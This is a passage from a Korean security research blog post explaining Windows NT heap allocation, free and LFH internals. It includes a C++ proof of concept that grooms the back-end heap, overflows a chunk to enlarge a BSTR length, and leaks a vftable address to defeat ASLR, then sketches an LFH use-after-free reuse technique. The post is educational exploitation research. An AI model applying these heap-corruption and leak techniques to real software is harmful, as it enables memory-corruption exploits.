chunk를 가져와 할당합니다.</li><li>적절한 크기의 chunk가 없으면 요청된 크기보다 더 큰 크기의 ListHint에서 가져온 chunk를 분할하고, 분할하고 남은 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">FreeList</a>에 삽입하고 ListHint에 넣습니다.</li><li>FreeList에 적절한 chunk가 없으면 <code>ExtendHeap</code>으로 Heap space를 확장해 chunk를 가져와 할당합니다.</li></ol><h3 id="LFH-Enabled"><a href="#LFH-Enabled" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><p>LFH가 활성화된 상태에서는 <code>RtlpLowFragHeapAllocFromContext</code> 함수에서 다음과 같은 과정으로 할당됩니다.</p><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</a>가 가리키는 Subsegment의 depth를 확인해 할당 가능한 chunk가 있는지 보고, 없으면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems</a> 에서 검색합니다.</li><li><code>CachedItems</code>에서 검색한 경우 <code>ActiveSubsegment</code>를 <code>CachedItem</code>의 Subsegment로 바꿉니다.</li><li><code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code> 값을 1 감소합니다.</li><li><code>0x0-0x7f</code> 사이의 랜덤 값들로 채워진 256 bytes 배열인 <code>RtlpLowFragHeapRandomData[x]</code> 에서 임의의 1 bytes 값을 읽어 Heap chunk의 인덱스로 사용합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a> 비트맵에서 읽어온 인덱스 위치에 chunk를 할당할 수 있는지 확인하고 할당합니다. 할당이 불가능하면 인접한 위치의 다른 index를 찾습니다.</li></ol><h2 id="0x4000-lt-Size-≤-0xff000"><a href="#0x4000-lt-Size-≤-0xff000" class="headerlink" title="0x4000 &lt; Size ≤ 0xff000"></a>0x4000 &lt; Size ≤ 0xff000</h2><p>LFH가 비활성화된 <code>0x4000</code> 이하 크기의 할당 프로세스와 동일합니다. 간단하죠? </p><h2 id="Size-gt-0xff000"><a href="#Size-gt-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><p>요청 사이즈가 <code>0xff000</code>보다 클 경우 <code>ZwAllocateVirtualMemory()</code>라는 가상 메모리 할당 함수를 사용해 메모리를 할당하며, 해당 chunk는 <code>_HEAP_ENTRY</code> 대신 <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> 구조체가 header가 됩니다. </p><h1 id="Free-in-NT-Heap"><a href="#Free-in-NT-Heap" class="headerlink" title="Free in NT Heap"></a>Free in NT Heap</h1><p>Free 할 때는 chunk 크기에 따라 두 가지로 나뉩니다.</p><ul><li>Size ≤ 0xff000</li><li>Size &gt; 0xff000</li></ul><h2 id="Size-≤-0xff000"><a href="#Size-≤-0xff000" class="headerlink" title="Size ≤ 0xff000"></a>Size ≤ 0xff000</h2><p>먼저 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP_ENTRY-&gt;UnusedBytes</a> 에서 해당 chunk가 LFH로 관리되고 있는지 확인합니다.</p><h3 id="LFH-Disabled-1"><a href="#LFH-Disabled-1" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP-&gt;FrontEndHeapUsageData</a> 값을 1 감소시킵니다.</li><li>이전 혹은 다음 chunk가 free 된 상태면 free 할 해당 chunk와 병합합니다.</li><li>병합한 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>의 시작 혹은 끝에 삽입할 수 있는지 확인합니다.</li><li>삽입 가능하면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>에, 아니라면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>에 chunk를 삽입합니다.</li></ol><h3 id="LFH-Enabled-1"><a href="#LFH-Enabled-1" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><ol><li>header를 디코딩해 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER</a> 와 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_SUBSEGMENT</a> 를 구합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_ENTRY-&gt;UnusedBytes</a> 값을 <code>0x80</code>으로 수정합니다.<ul><li><code>UnusedBytes</code>가 <code>0x80</code>이면 해제된 LFH chunk로 인식합니다.</li></ul></li><li>chunk의 인덱스를 찾아 메모리 할당 비트맵인 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a>에 해제할 chunk에 해당하는 bit를 0으로 수정합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">_HEAP_SUBSEGMENT-&gt;AggregateExchg</a> 의 depth를 1 증가시킵니다.</li><li>만약 해제된 chunk가 <code>ActiveSubsegment</code> 에 속하지 않은 경우 <code>CachedItem</code> 에 넣습니다.</li></ol><h2 id="Size-gt-0xff000-1"><a href="#Size-gt-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><ol><li>해제할 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;VirtualAllocdBlocks</a> 에서 제거합니다.</li><li><code>RtlSecMemFreeVirtualMemory</code> 함수를 사용해 할당 해제합니다.</li></ol><p>복잡한 것처럼 보이지만, 사용하는 구조체 필드 설명을 part 1을 보면서 이해하면 <del>그래도 복잡하지만</del> Heap 메모리를 어떻게 관리하는지 보입니다!</p><h1 id="NT-Heap-Exploitation"><a href="#NT-Heap-Exploitation" class="headerlink" title="NT Heap Exploitation"></a>NT Heap Exploitation</h1><p>일반적인 Back-End exploitation과 LFH인 Front-End exploitation 두 가지로 나뉩니다. </p><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><p>LFH는 <code>0x4000</code> 이하 크기의 chunk가 18개 할당될 때부터 활성화된다는 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap">내용</a>이 part 2에서 나왔었죠? Back-End에서 취약점을 트리거하려면 LFH가 비활성화된 상태여야 하므로 chunk 할당을 18개 미만으로 제한해야 합니다. 보통 첫 번째(index 0)와 두 번째(index 1) 할당에도 chunk 간 거리가 크기 때문에 적합하지 않으니 우리가 접근하기 좋은 chunk의 index는 2 ~ 16 까지겠네요. 그 이후에는 일반적인 heap overflow로 chunk를 정렬하고 필요한 주소를 leak 하는 방법과 동일합니다.</p><p>예제코드로 확인해볼게요.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;comdef.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x190</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALLOC_COUNT 10</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeObject</span> &#123;</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">virtual_function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;&#125;;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> args, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">int</span> i;    BSTR bstr;    HANDLE hChunk;    <span class="hljs-keyword">void</span>* allocations[ALLOC_COUNT];    BSTR bStrings[<span class="hljs-number">5</span>];    SomeObject* object = <span class="hljs-keyword">new</span> SomeObject();    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Default heap = 0x%08x\n&quot;</span>, defaultHeap);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ALLOC_COUNT; i++) &#123;        hChunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">memset</span>(hChunk, <span class="hljs-string">&#x27;A&#x27;</span>, CHUNK_SIZE);        allocations[i] = hChunk;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Heap chunk in backend : 0x%08x\n&quot;</span>, i, hChunk);    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 3: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">3</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">3</span>]);       <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;        bstr = SysAllocString(<span class="hljs-string">L&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);        bStrings[i] = bstr;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] BSTR string : 0x%08x\n&quot;</span>, i, bstr);    &#125;    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 4: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">4</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">4</span>]);    <span class="hljs-keyword">int</span> objRef = (<span class="hljs-keyword">int</span>)object;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject address for Chunk 3 : 0x%08x\n&quot;</span>, objRef);    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array1</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array2</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array3</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array4</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array5</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array6</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array7</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array8</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array9</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array10</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array1);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array2);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array3);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array4);           system(<span class="hljs-string">&quot;PAUSE&quot;</span>);     UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);    <span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;    <span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));    strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];    <span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ol><li>index 0~9까지 chunk 10개를 할당합니다. </li><li>chunk[3]를 해제한 뒤 BSTR string을 할당합니다.<ul><li>BSTR : <code>Header + String + NULL terminator</code> 형식의 자료형으로 각 문자는 2 bytes 크기를 가지며 헤더에 객체의 size가 저장됨</li></ul></li><li>chunk[4]를 해제한 뒤 virtual function table pointer가 있는 <code>SomeObject</code> 객체 포인터 배열을 할당합니다.</li></ol><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%202.png" alt="pwncoolsexy-part3/Untitled%202.png"></p><pre><code class="hljs cpp">| CHUNK[<span class="hljs-number">0</span>] | CHUNK[<span class="hljs-number">1</span>] | CHUNK [<span class="hljs-number">2</span>] | BSTR [<span class="hljs-number">0</span>] | SomeObejct | CHUNK[<span class="hljs-number">5</span>] | ...</code></pre><p>실행결과에서 해제한 chunk[3]에 BSTR[0] 이, chunk[4]에는 SomeObject 포인터 배열이 할당된 것을 확인할 수 있습니다. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%203.png" alt="pwncoolsexy-part3/Untitled%203.png"></p><p>메모리 덤프에서 봐도 예쁘게 잘 정렬됐네요~</p><p>heap overflow를 이용해 chunk[2]에서 BSTR 헤더의 length 필드의 값을 <code>F8</code> → <code>FF</code> 로 수정하면 다음 chunk의 데이터를 읽을 수 있습니다.</p><pre><code class="hljs cpp">... UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);<span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;<span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%204.png" alt="pwncoolsexy-part3/Untitled%204.png"></p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%205.png" alt="pwncoolsexy-part3/Untitled%205.png"></p><p>이제 vftable 주소를 읽는 것만 남았습니다.</p><pre><code class="hljs cpp">...<span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);<span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%206.png" alt="pwncoolsexy-part3/Untitled%206.png"></p><p>vftable 주소의 offset은 고정이므로 offset을 구해두면 이후에 imagebase가 바뀌어도 vftable을 leak 한 뒤 offset을 빼 imagebase를 쉽게 구할 수 있습니다.</p><pre><code class="hljs cpp">Executable search path is: ModLoad: <span class="hljs-number">002f</span>0000 <span class="hljs-number">002f</span>9000   C:\Users\dw0rdptr\source\repos\LFH\Release\LFH.exeModLoad: <span class="hljs-number">77210000</span> <span class="hljs-number">773b</span>2000   C:\WINDOWS\SYSTEM32\ntdll.dllModLoad: <span class="hljs-number">75</span>a80000 <span class="hljs-number">75b</span>70000   C:\WINDOWS\System32\KERNEL32.DLL</code></pre><p>현재 imagebase 가 <code>0x2f0000</code>이니까 offset은 <code>0x2f4690 - 0x2f0000 = 0x4690</code> 가 됩니다. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%207.png" alt="pwncoolsexy-part3/Untitled%207.png"></p><p>제대로 구했네요! 이렇게 LFH가 활성화되지 않은 Heap은 chunk를 재활용하는 프로세스를 쉽게 이용할 수 있습니다.</p><h2 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h2><p>LFH는 다음 할당되는 chunk의 위치를 예측할 수 없도록 랜덤으로 할당해 heap overflow나 UAF 등의 취약점이 발생해도 heap을 제어하기 어렵도록 설계되었습니다.</p><p>그럼 LFH에서의 exploitation 목표는 <code>해제 후 재 할당되는 chunk의 위치를 예측 가능하게 하는 것</code> 이 되겠네요. </p><p>A 객체를 해제하고 같은 크기의 B로 재 할당하는 UAF 시나리오를 가정해보겠습니다.</p><ul><li>A를 할당합니다.</li><li>A와 같은 크기의 B를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">UserBlock</a>을 모두 채울때까지 할당합니다.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%208.png" alt="pwncoolsexy-part3/Untitled%208.png"></p><ul><li>A를 해제한 이후 B를 할당하면 <code>UserBlock</code>에는 해제한 A 공간밖에 남아있지 않아 해제된 A chunk에 할당하게 되고 UAF를 트리거할 수 있습니다.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%209.png" alt="pwncoolsexy-part3/Untitled%209.png"></p><p>다음 글에서는 HITCON CTF 2019 QUAL에서 출제된 문제인 dadadb를 풀어보면서 LFH의 reuse attack 이슈에 대해 자세히 알아보겠습니다! </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lfh/">lfh</category>
+      
